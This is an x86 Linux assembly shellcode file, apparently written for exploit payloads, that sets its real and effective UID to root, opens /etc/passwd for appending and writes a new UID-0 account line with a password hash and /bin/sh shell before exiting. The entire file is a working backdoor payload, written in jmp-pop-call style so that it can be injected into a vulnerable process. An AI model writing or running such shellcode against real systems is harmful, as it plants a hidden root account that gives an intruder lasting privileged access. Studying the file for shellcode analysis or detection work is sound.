; Name; asm_linx86_adduser_jmp-pop-call.asm
; Author hodorsec

global _start
section .text

_start:
	; setreuid
	; int setreuid(uid_t ruid, uid_t euid);
	xor ecx,ecx		; Clear registers -> ECX 0 for effective UID root
	mov ebx,ecx		; Clear registers -> EBX 0 for real UID root
	push byte +0x46		; For function call sys_setreuid16
	pop eax			; Place in EAX
	int 0x80		; Syscall

	; sys_open
	; int open(const char *pathname, int flags);
	push byte +0x5		; Put 5 on stack, syscall sys_open
	pop eax			; Put the value in EAX for syscall sys_open
	push ebx		; Still being NULL, push EBX to terminate string
	push dword 0x64777373	; 'sswd'
	push dword 0x61702f2f	; '//pa'
	push dword 0x6374652f	; '/etc'
	mov ebx,esp		; Put string in EBX as flags argument for sys_open, as filepointer
	; mov ecx, ebx		; Move the value from EBX in ECX for incrementing. ECX already NULL, no need to use
	inc ecx			; Increment ECX, 0x0001
	mov ch,0x4		; Mode parameter for sys_open in CX 0x0401 for flags for sys_open call
	int 0x80		; Syscall

	; sys_write
	; ssize_t write(int fd, const void *buf, size_t count);
	xchg eax, ebx		; File Descriptor in EBX
	jmp string		; Goto string

append:
	; sys_write, continue
	; ssize_t write(int fd, const void *buf, size_t count);
	pop ecx			; Put value of AppendString in ECX
	mov byte dl, len	; Put length of string in DL of EDX
	push 0x4		; Put 0x4 on stack, syscall sys_write
	pop eax			; Put in EAX
	int 0x80		; Syscall

	; sys_exit
	; void exit(int status);
	; push 0x1		; Exit 1
	; pop eax			; Put in EAX for syscall
	add eax, 0xa		; EAX was 0xfffffff7, increment by 0xa for rolling over to 0x1
	int 0x80    		; Syscall
    
string:
	call append
	AppendString db "hodor:AzmuZrosBjRYU:0:0::/:/bin/sh"		; size 35
	len: equ $-AppendString						; Variable for stringlength

